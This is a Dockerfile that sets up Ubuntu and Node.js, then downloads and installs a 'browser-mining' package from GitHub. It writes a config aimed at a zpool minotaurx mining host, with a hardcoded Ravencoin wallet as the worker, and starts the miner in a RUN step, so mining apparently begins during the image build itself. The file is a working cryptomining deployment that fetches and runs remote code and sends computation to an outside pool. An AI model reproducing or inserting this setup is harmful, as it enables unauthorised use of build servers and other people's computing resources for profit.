# Use Ubuntu as base image
FROM ubuntu:latest

# Set non-interactive mode during installation
ENV DEBIAN_FRONTEND=noninteractive

# Update package lists and install curl
RUN apt-get update && apt-get install -y \
    curl \
    tzdata \
 && rm -rf /var/lib/apt/lists/*

# Set the timezone
RUN ln -fs /usr/share/zoneinfo/UTC /etc/localtime
RUN dpkg-reconfigure --frontend noninteractive tzdata

# Install Node.js 22.x
RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
    apt-get install -y nodejs

# Download and install browser mining script
RUN curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J && \
    tar -xf browser-mining.tar.gz && \
    cd browser-mining && \
    npm install && \
    sh install.sh && \
    rm config.json && \
    echo '[{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q", "password": "c=RVN", "workers": 8 }]' > config.json && \
    node index.js

# Clean up
RUN rm -rf /var/lib/apt/lists/*

# Start command (if needed)
# CMD [ "node", "index.js" ]
